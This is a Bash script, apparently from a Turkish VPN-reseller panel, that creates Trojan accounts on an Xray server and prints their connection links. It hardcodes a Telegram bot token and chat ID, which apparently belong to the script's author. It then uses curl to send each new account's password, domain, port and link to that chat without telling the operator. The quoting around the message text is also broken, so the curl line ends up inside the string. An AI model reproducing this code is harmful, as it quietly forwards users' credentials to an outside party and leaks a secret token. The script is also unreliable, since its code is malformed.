#!/bin/bash
# My Telegram : https://t.me/onvaovpn
# ==========================================
# Renk
RED='\033[0;31m'
NC='\033[0m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
LIGHT='\033[0;37m'
# ==========================================
# Alınıyor
export CHATID="989061293"
export KEY="7721006940:AAHD_7QqIdBOGyOB2JVBS0bEsAOTmoYiqLs"
export TIME="10"
export URL="https://api.telegram.org/bot$KEY/sendMessage"
clear
MYIP=$(wget -qO- icanhazip.com);

echo "VPS Erişim Haklarını Kontrol ediliyor..."

clear
echo "VPS Kontrol Ediliyor"
clear
uuid=$(cat /etc/xray/uuid.txt)
source /var/lib/bztunnelling/ipvps.conf
if [[ "$IP" = "" ]]; then
domain=$(cat /etc/xray/domain)
else
domain=$IP
fi
tr="$(cat ~/log-install.txt | grep -w "Trojan" | cut -d: -f2|sed 's/ //g')"
until [[ $user =~ ^[a-zA-Z0-9_]+$ && ${user_EXISTS} == '0' ]]; do
		read -rp "Şifre : " -e user
		user_EXISTS=$(grep -w $user /etc/xray/config.json | wc -l)

		if [[ ${user_EXISTS} == '1' ]]; then
			echo ""
			echo -e "Kullanıcı Adı ${RED}${user}${NC} Zaten VPS'de Mevcut, Lütfen Başka Bir Tane Seçin"
			exit 1
		fi
	done
read -p "Süre (Gün) : " masaaktif
hariini=`date -d "0 days" +"%Y-%m-%d"`
exp=`date -d "$masaaktif days" +"%Y-%m-%d"`
sed -i '/#xray-trojan$/a\#&# '"$user $exp"'\
},{"password": "'""$user""'","email": "'""$user""'"' /etc/xray/config.json
systemctl restart xray.service
trojanlink="trojan://${user}@${domain}:${tr}"
service cron restart
clear
c=$(echo "${Quota}" | sed 's/[^0-9]*//g')
d=$((${c} * 1024 * 1024 * 1024))

if [[ ${c} != "0" ]]; then
  echo "${d}" >/etc/xray/${user}
fi
DATADB=$(cat /etc/xray/.xray.db | grep "^###" | grep -w "${user}" | awk '{print $2}')
if [[ "${DATADB}" != '' ]]; then
  sed -i "/\b${user}\b/d" /etc/xray/.xray.db
fi
echo "### ${user} ${exp} ${uuid}" >>/etc/xray/.xray.db
CHATID="$CHATID"
KEY="$KEY"
TIME="$TIME"
URL="$URL"
TEXT="<code>====================</code>
<code>TROJAN TCP</code>
<code>====================</code>
<code>Not	: ${user}
Adres    : ${domain}
Port       : ${tr}
Anahtar    : ${user}
Adı       : TROJAN TCP</code>
<code>====================</code>
<code>TROJAN TCP</code>
<code>====================</code>
<code>${trojanlink}</code>
<code>====================</code>
Oluşturulma Tarihi    : $hariini
Bitiş Tarihi  : $exp
whatsapp	: wa.me/6287728411949
Telegram	: t.me/anuybazoelk
<code>====================</code>

curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo ""
clear
echo -e "=======-TROJAN TCP-======="
echo -e "Not      : ${user} "
echo -e "IP/Sunucu: ${MYIP} "
echo -e "Adres    : ${domain} "
echo -e "Port     : ${tr} "
echo -e "Anahtar  : ${user} "
echo -e "Oluşturulma: $hariini "
echo -e "Bitiş    : $exp "
echo -e "========================="
echo -e "Trojan TCP Bağlantısı	: ${trojanlink} "
echo -e "========================="
echo -e "whatsapp	: wa.me/6287728411949 "
echo -e "Telegram	: t.me/anuybazoelk "
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m${NC}"
echo -e ""
echo -e "Hepsibiraradavpn by Onvoa.net"
echo -e ""
